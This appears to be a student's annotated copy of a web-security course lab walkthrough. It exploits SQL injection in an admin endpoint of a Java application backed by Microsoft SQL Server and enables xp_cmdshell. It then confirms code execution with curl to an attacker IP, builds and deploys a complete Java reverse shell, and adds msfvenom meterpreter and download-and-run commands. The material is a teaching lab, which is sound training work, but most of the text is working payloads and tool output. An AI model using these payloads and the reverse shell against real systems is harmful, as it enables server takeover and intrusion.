This Learning Unit covers the following Learning Objectives:

1. Discover a SQL injection vulnerability
2. Exploit the SQL injection vulnerability to obtain remote code execution
3. Gain shell access to the server

Now that we have access to the admin section, we have access to view and delete user-submitted messages and newsletter subscriptions. Let's click on theÂ _Delete_Â button for our test message and test subscription so we have sample requests in Burp Suite for each function.

When the web application prompts us if we're sure we want to delete, we'll clickÂ _OK_Â each time. Next, we'll go to the HTTP history tab in Burp Suite and send the two POST requests to Repeater before continuing to the next section.

----------

#### 16.4.1 Finding SQL Injection

Because unauthenticated users can submit messages or subscribe to the newsletter and the admin page includes the results, the application likely uses a database. Let's inspect the request that deleted a message.

```bash
POST /admin/message/delete?id=4 HTTP/1.1
Host: asio
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://asio
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://asio/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=C0C3B7B39FB409EC20E31AF0B715C801
Connection: close
```

Our browser sent a POST request toÂ /admin/message/deleteÂ with a query string of "id=4". The request does not include a POST body, so the application must be using the value in the query string.

Let's try testing theÂ _id_Â parameter in the query string for SQL injection. If the application is using this value to construct a SQL query, it might end up with something like `DELETE FROM some_table WHERE some_id = 4`.

In Burp Suite, let's go to the Repeater tab with this request and clickÂ _Send_Â so we have the normal response.

![[Pasted image 20241108163303.png]]

The application responded with an HTTP 302, redirecting back toÂ `http://asio/admin`. Let's try adding a `single quote` to theÂ _id_Â value. Remember, numeric fields do not need to be inside quotes in SQL. If the application is vulnerable to SQL and constructs a query with our input, adding a single quote would likely cause a syntax error.

***If the application redirects us toÂ http://asio/login, our session has expired. In which case, we would need to log in with the API key again and update the JSESSIONID value in Repeater.***

Let's add a single quote, changing `id=4` to `id=4'`, and then clickÂ _Send_.

![[Pasted image 20241108163516.png]]

The application responded with an HTTP 500 Internal Server Error. We might have discovered a SQL injection vulnerability. Because we're trying to delete a message, the application is likely either updating one or more fields in the record or deleting the record entirely. In either case, a union payload won't work since the application doesn't display the results of the query.

If the database supports them, stack queries can be extremely useful when injecting into DELETE or UPDATE statements. Not all databases support stacked queries, but PostgreSQL and Microsoft SQL Server typically support them. TheÂ `application.properties`Â file we found with our directory traversal attack included a database section and which driver the application uses.

```bash
...
# DATABASE
spring.datasource.driver-class-name=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.url=jdbc:sqlserver://127.0.0.1;databaseName=strigi
...
```

TheÂ application.propertiesÂ file lists a driver for Microsoft SQL Server. This means stacked queries should work. We can verify this with a simple stacked query, such as selecting the SQL Server version.

In Repeater, let's update theÂ _id_Â parameter to `4;SELECT @@VERSION;`. We'll need to encode the space as a plus sign (+) before we clickÂ _Send_.

![[Pasted image 20241108163746.png]]

The application responded with an HTTP 302 redirecting back toÂ `/admin`. The application responds the same way to a valid request, but we don't know if our stacked query actually worked.

We can try to insert a record to determine if the database executed our stacked query. However, we don't know the table names. If we assume the web page contents include everything in the corresponding tables, then the "`newsletter subscriptions`" table would have ID and Email fields. If the ID field auto increments,[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/finding-sql-injection-37060#fn-local_id_291-1)Â we wouldn't need to include a value for it in an INSERT statement, thus simplifying our payload.

At this point, we're making several assumptions or guesses. We also don't know the table name we're targeting. However, we can still do some fuzzing based on our educated guesses. Let's start by making a short wordlist of what the table name might be.

```bash
kali@kali:~$ nano tables.txt

kali@kali:~$ cat tables.txt
newsletter
newsletters
subscription
subscriptions
newsletter_subscription
newsletter_subscriptions
```

Now that we have our wordlist, let's plan our payload. We need to insert an email address into an unknown table. The page responds with an HTTP 302 on a valid request and since we're stacking queries, we may not know which payload was successful. To account for this, let's insert the table name in the email column instead of a static value. The application should display the table name on the admin page in the list of subscriptions if the application processes our payload.

We'll use Wfuzz with two payloads again. This is our base SQL payload:\

```sql
insert into TABLE_NAME values('EMAIL_VALUE')
```
We want the same value placed as both the table name and the email value. For each field we want to fuzz, we need to include a payload. In both cases, we'll use the same wordlist, but we need Wfuzz to only iterate through the files once, sending the first values of both files on the first request, the second values on the second request, and so on. We can control how Wfuzz combines payloads by specifying an iterator.[2](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/finding-sql-injection-37060#fn-local_id_291-2)

We'll runÂ wfuzzÂ and setÂ `-w tables.txt`Â twice, followed byÂ `-m zip`Â to specify a zip iterator. Since the request requires authentication, we'll setÂ -bÂ followed by our `JSESSIONID` value, which we can find in Burp Suite. We'll addÂ `-d ""`Â to send a POST request with an empty POST body and finally, specify our URL. Since the URL includes semicolons, we'll enclose it in double quotes.


```bash
wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=82909C3239ACEE2EBCCCD66CA4B4B2D2 -d "" "http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
Target: http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')
Total requests: 6

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                       
=====================================================================
000000005:   302        0 L      0 W        0 Ch        "newsletter_subscription - newsletter_subscription"                                           
000000003:   302        0 L      0 W        0 Ch        "subscription - subscription"                                                                 
000000001:   302        0 L      0 W        0 Ch        "newsletter - newsletter"                                                                     
000000004:   302        0 L      0 W        0 Ch        "subscriptions - subscriptions"                                                               
000000002:   302        0 L      0 W        0 Ch        "newsletters - newsletters"                                                                   
000000006:   302        0 L      0 W        0 Ch        "newsletter_subscriptions - newsletter_subscriptions" 
```

Wfuzz sent six requests and the application responded to all of them with an HTTP 302. We'll need to refresh the admin page in our browser to verify which payload worked.

![[Pasted image 20241108164320.png]]

Excellent. Our payload with "subscriptions" worked. We were able to correctly fuzz for a table name and verify the database executes stacked queries. In the next section, we'll use stacked queries and the information we've gathered to obtain remote code execution.

#### 16.4.2. Exploit SQL Injection for RCE

When we are assessing a web application and successfully exploit a vulnerability, it is often useful to take a step back and think about what information we found during enumeration and how it applies to the vulnerability.

In our case, we can execute stacked queries through SQL injection attacks. TheÂ `application.properties`Â file contains some additional information that we will find useful.

```
...
spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ
...
```

Based on the file, the application may be connecting to the database as the `sa` user. The "sa" user in SQL Server is typically the System Administrator account and has elevated permissions on the server, including the ability to change configuration settings.

Most importantly to us, if our SQL injection payloads are executed under the `sa` user, we should be able to enable and useÂ _xp_cmdshell_.

First, we need a payload that enables advanced options. We can use Microsoft's documentation[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/exploit-sql-injection-for-rce-37059#fn-local_id_331-1)Â as the basis of our payload.

```bash
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
```

We'll need to encode spaces and then send the payload in Repeater.
```bash
4;EXECUTE+sp_configure+'show+advanced+options',1;+RECONFIGURE;
```

![[Pasted image 20241108190236.png]]
The server responds with an HTTP 302. The SQL statement to enable advanced options doesn't typically result in any output. Since the server didn't return an error, we can assume our command was successful. Next, we'll enableÂ _xp_cmdshell_. Again, Microsoft's documentation provides the basis of our payload.

```sql
EXECUTE+sp_configure+'xp_cmdshell',1;+RECONFIGURE;
```


![[Pasted image 20241108190746.png]]

Next, we will callÂ _xp_cmdshell_Â and verify the database enabled it. We could query the database to determine ifÂ _xp_cmdshell_Â is enabled and insert the results into the subscriptions table. However, we'll use an easier approach. Let's callÂ _xp_cmdshell_Â and execute a curl request back to our host.

We'll start a netcat listener at port 8000.

```bash
kali@kali:~$ nc -nvlp 8000
listening on [any] 8000 ...
```
Now that our listener is running, we'll update our SQL injection payload to call curl withÂ _xp_cmdshell_Â and pass in our Kali's IP address and the port of our listener. Here's our base SQL injection payload:

```sql
EXEC+xp_cmdshell+'curl+http://192.168.45.222:8000/itworked'; 
```

We'll need to encode the spaces before we send the payload with Repeater.

![[Pasted image 20241108192142.png]]

Unlike our previous payloads, the application does not respond to our request. However, if we check our listener, we did receive the curl request.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[08Nov2024 21:41:54]-[/home/kali/SUT/OSWA]
â””â”€# nc -lvnp 8000    
listening on [any] 8000 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.169.131] 50037
GET /itworked HTTP/1.1
Host: 192.168.45.222:8000
User-Agent: curl/7.55.1
Accept: */*

```
Excellent. We have confirmed remote code execution on the server through the database. Our next step will be obtaining a full shell on the server.

#### 16.4.3. Obtaining a Shell

Now that we're able to execute commands on the server, let's work on getting a reverse shell. Windows Server usually won't have Netcat installed. While Kali Linux includes a Windows binary version of Netcat, Windows Defender will easily identify and remove it if we try to upload it to the server.[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/exploit-sql-injection-for-rce-37059#fn-local_id_375-1)While there are ways to modify binaries to bypass antivirus detection, those techniques go beyond the scope of this course.
Instead, let's focus on what is available on the server. Since the application is Java-based, we should be able to run a Java reverse shell.

***In real-world application assessments, we may need to customize a reverse shell or some other piece of code to complete an attack. However, we recognize that WEB-200 is not a programming course. While we will walk through the code and explain it, we will also provide a copy of the final shell at the end of this section.***

We can find several examples of Java reverse shells online. Many examples are written for Linux and therefore targetÂ _bash_Â orÂ _sh_Â to run commands. Since we're targeting Windows, we'll need to runÂ _cmd.exe_Â in our shell. We'll use one fromÂ _Payload All The Things_[2](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-2)Â as the starting point of our Windows targeting Java reverse shell. However, this shell is incomplete, so we'll need to write some code to finish it.

Let's start with the basic shell and review the code.

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Line 1 declares a string variable for the host that the shell will connect back to. Line 2 defines the port number to connect back to. We'll need to update these values to match our IP address and the listener port we intend to use. Line 3 declares which command we want to run. Since we're targeting Windows, we will leave this value as "cmd.exe".

Line 4 contains several lines of code concatenated together. In Java, semicolons mark where an instruction ends. We can have several instructions on one line if the semicolons are in the correct positions. The instructions on line 4 create a Process object by runningÂ cmd.exe. Next, they create a socket connecting to theÂ _host_Â andÂ _port_Â values. The input and output streams from the cmd.exe process are then sent over this socket, essentially allowing the remote listener to issue commands and get the output.

We'll need to wrap this code in a proper Java class. We can use a "hello world"[3](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-3)Â example to get the right syntax. Oracle's Java tutorials include a perfect example:[4](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-4)

```java
class HelloWorldApp {
    public static void main(String[] args) {
        System.out.println("Hello World!"); // Display the string.
    }
}
```

The first line declares a class namedÂ _HelloWorldApp_. In Java, the class name must match the file name. The first line ends with a left curly brace ({). A set of curly braces ({}) mark a section of code, also known as scope in Java. Sets of braces can be nested within each other. The compiler will close the braces in the order they are opened.

In other words, the curly braces on lines 1 and 5 match each other, creating the scope of theÂ _HelloWorldApp_Â class, and the curly braces on lines 2 and 4 match, creating the scope of theÂ _main()_Â method, which resides within the scope of theÂ _HelloWorldApp_Â class. Typically, we indent each section of code one level deeper than the surrounding scope.

TheÂ _main()_Â method is an entry point for a Java program. If we were to run the HelloWorldApp,Â _main()_Â would automatically run and the instructions on line 3 would be executed. In this example, the program would print out the text "Hello World!", then exit since there are no more instructions.

Since our class name has to match our file name, let's create a file namedÂ RevShell.java.

```bash
kali@kali:~$ nano RevShell.java
```

Next, we'll add the basic class structure based on the HelloWorldApp example. Let's change the class name to match our file name.

```java
class RevShell {
    public static void main(String[] args) {
        
    }
}
```
We should note that our class name matches our file name, but we exclude the file suffix.

Next, we need to add someÂ _import_Â statements. Import statements tell the compiler we want to use external classes that are not defined in our code. If we tried to compile or run our Java reverse shell without importing the necessary classes, we'd receive an error.

We'll add the followingÂ _import_Â statements at the start of the file, before the line with "class RevShell":

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
```

Next, we'll place the example reverse shell within theÂ _main()_Â method. We'll need to update the IP address value in theÂ _host_Â variable.

Our file should now contain the following code:

```bash
kali@kali:~$ cat RevShell.java                                                    
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) {
        String host="192.168.45.222";
        int port=4444;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    }
}
```

Our code is missing one last piece. If we tried to compile it, we would receive several errors.

***We compile Java code with theÂ _javac_Â command. In this scenario, we can rely on the victim machine to compile the code for us. However, if you wish to run javac locally but the command is not found, you can install the necessary files withÂ `sudo apt-get install default-jdk`.***


```bash
kali@kali:~$ javac RevShell.java                
RevShell.java:11: error: unreported exception IOException; must be caught or declared to be thrown
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
...
```

We received several compiler errors regarding exceptions that "must be caught or declared to be thrown". When an error occurs in a Java program, the runtime creates anÂ _exception_[5](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-5)Â object. There are many different types of exceptions, such as the IOException called out in Listing 27. Each exception includes information about what caused the error.

Programmers can handle exceptions inline with aÂ _try_Â andÂ _catch_Â block[6](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-6)Â or they can beÂ _thrown_[7](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-7)Â up one level of scope, back to the code that called the method that caused the error. When a method throws an exception, the original calling code must handle or throw the exception. If a program throws an exception but does not handle it, the program will crash.

In our case, we can add "throws Exception" to ourÂ _main()_Â method. If our shell crashes, we can always run it again.

```java
...
  public static void main(String[] args) throws Exception {
...
```

full payload:

```java
kali@kali:~$ cat RevShell.java                                                    
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) throws Exception {
        String host="192.168.45.222";
        int port=4444;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    }
}
```

Since we're targeting Windows with this shell, it won't work if we run it locally in our Kali VM. We would need to change "cmd.exe" to "/bin/bash" or "/bin/sh" for it to work on Linux.

Now that we have our reverse shell, we need to get it on the remote server. Let's use a Python HTTP server to host the file and then use our SQL injection payload to download the file with curl and write it to a known location. Next, we can use a second payload to run the file.

Let's start by runningÂ python3Â withÂ -m http.serverÂ to run the HTTP server module and then specify our port. Since we used port 8000 in our curl command earlier, we'll reuse that value.

```bash
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Next, we'll update our SQL injection payload in Burp Suite Repeater to downloadÂ RevShell.java. We'll need to write it to a directory that the database software can access. Most systems haveÂ _temp_[8](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-8)Â directories that are world writeable. We'll try to write to the temp directory using theÂ _%temp%_Â system variable.

```sql
EXEC xp_cmdshell 'curl http://192.168.45.222:8000/RevShell.java --output %temp%/RevShell.java'; 
```

Let's paste our payload in Repeater, encode the spaces and percent signs, then clickÂ _Send_.
payload with `CTRL+U` in burpsuite
```bash
EXEC+xp_cmdshell+'curl+http%3a//192.168.45.222%3a8000/RevShell.java+--output+%25temp%25/RevShell.java'%3b+
```
Because the server responded with an HTTP 302, our payload seems to have worked. Let's check our Python HTTP server to verify.

```bash
...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.50.131 - - [18/Jan/2022 16:38:46] "GET /RevShell.java HTTP/1.1" 200 -
```

Excellent. The server downloaded our reverse shell file. Let's stop our Python server withÂ C+c.

Now we need to compile and run our shell file on the remote server. Java 11 and newer versions can run singleÂ .javaÂ files without having to explicitly compile them in advance.[9](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-9)Â We don't know the version of Java running on the server, but let's try running theÂ javaÂ command to compile and run our reverse shell.

First, however, we'll need to start a listener to handle the reverse shell.

```bash
kali@kali:~$ nc -nvlp 4444 
listening on [any] 4444 ...
```

Now that we have a listener running, let's update our SQL injection payload to run our reverse shell.

***On older versions of Java, we'd need to compile the source file using javac. The compiler creates a class file with the same name, but no file extension. In theory, we could compile it locally and upload the class file. However, we would have to know the version of Java running on the server to ensure we compiled our code at the right target version. Java is backwards-compatible, so newer versions of Java will run code compiled for older versions. However, there are exceptions where updates removed some APIs from newer versions due to security concerns.***

```sql
EXEC xp_cmdshell 'java %temp%/RevShell.java';  
```
`Ctrl+U` in burpsuite to encode
```sql
EXEC+xp_cmdshell+'java+%25temp%25/RevShell.java'%3b++
```

Let's paste our payload in Repeater, encode the spaces and percent signs, and clickÂ _Send_.

![[Pasted image 20241108215802.png]]

Excellent. Our attack worked and we now have a reverse shell on the machine. We can find theÂ proof.txtÂ file in the working directory of the reverse shell. We can submit this value on the Labs page to gain credit for completing the remote code execution portion of this challenge machine.


```bash
C:\Windows\system32>type proof.txt
type proof.txt
13723e3c3dd8c78944da2fd9149231fc
```

![[Pasted image 20241108220013.png]]

whoami
```bash
C:\Windows\Temp>whoami
whoami
nt service\mssql$sqlexpress
```
systeminfo
```bash
C:\Windows\Temp>systeminfo                                                                                                                                                                                 
systeminfo                                                                                                                                                                                                 
                                                                                                                                                                                                           
Host Name:                 WIN-KVMM9OID14T                                                                                                                                                                 
OS Name:                   Microsoft Windows Server 2019 Standard                                                                                                                                          
OS Version:                10.0.17763 N/A Build 17763                                                                                                                                                      
OS Manufacturer:           Microsoft Corporation                                                                                                                                                           
OS Configuration:          Standalone Server                                                                                                                                                               
OS Build Type:             Multiprocessor Free                                                                                                                                                             
Registered Owner:          Windows User                                                                                                                                                                    
Registered Organization:                                                                                                                                                                                   
Product ID:                00429-70000-00000-AA514                                                                                                                                                         
Original Install Date:     12/14/2021, 2:40:18 AM                                                                                                                                                          
System Boot Time:          5/7/2024, 6:04:20 AM                                                                                                                                                            
System Manufacturer:       VMware, Inc.                                                                                                                                                                    
System Model:              VMware7,1                                                                                                                                                                       
System Type:               x64-based PC                                                                                                                                                                    
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows     
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2 
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,095 MB                                                                  
Available Physical Memory: 1,804 MB                                                                  
Virtual Memory: Max Size:  4,799 MB            
Virtual Memory: Available: 2,533 MB                                                                  
Virtual Memory: In Use:    2,266 MB                                                                  
Page File Location(s):     C:\pagefile.sys                                                                                                                                                                 
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 7 Hotfix(s) Installed.

```
msfvenom payload
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[09Nov2024 03:06:38]-[/home/kali/SUT/OSWA]                                         
â””â”€# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.222 LPORT=4445 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload               
[-] No arch selected, selecting arch: x64 from the payload                                           
No encoder specified, outputting raw payload                                                         
Payload size: 510 bytes                           
Final size of exe file: 7168 bytes                                                                   
Saved as: revshell.exe
```
python3 server
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[09Nov2024 03:06:50]-[/home/kali/SUT/OSWA]
â””â”€# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
curl
```bash
curl http://192.168.45.222:8000/revshell.exe -o C:\Windows\Temp\revshell.exe
```

```bash
Invoke-WebRequest -Uri "http://192.168.45.222:8000/revshell.exe" -OutFile "C:\Windows\Temp\revshell.exe"
Invoke-WebRequest -Uri "http://192.168.45.222:8000/revshell.exe" -OutFile "C:\users\public\revshell.exe"


```
#### 16.4.4. Conclusion

We have fully exploited the first challenge machine and obtained a reverse shell. During this Learning Module, we learned the importance of enumeration and how to apply and modify the different web application attacks we learned throughout the course.

The remaining challenge machines can be attempted in any order. While each machine is different, they usually contain one authentication bypass vector and one remote code execution vector. The exercises and extra miles in the previous Learning Modules provide the knowledge and practice needed to exploit these machines.

If you're having trouble, consider filling in knowledge gaps in the course material. If you're still stuck, step back and take on a new perspective. It's easy to get so fixated on a single challenge that you ignore the fact that there may be a simpler solution waiting down a different path. Take good notes and review them often. Search for alternate paths that might advance your assessment. When all else fails, do not hesitate to reach out to the student administrators. Finally, remember that you often have all the knowledge you need to tackle the problem in front of you. Don't give up and always remember the "Try Harder" mindset!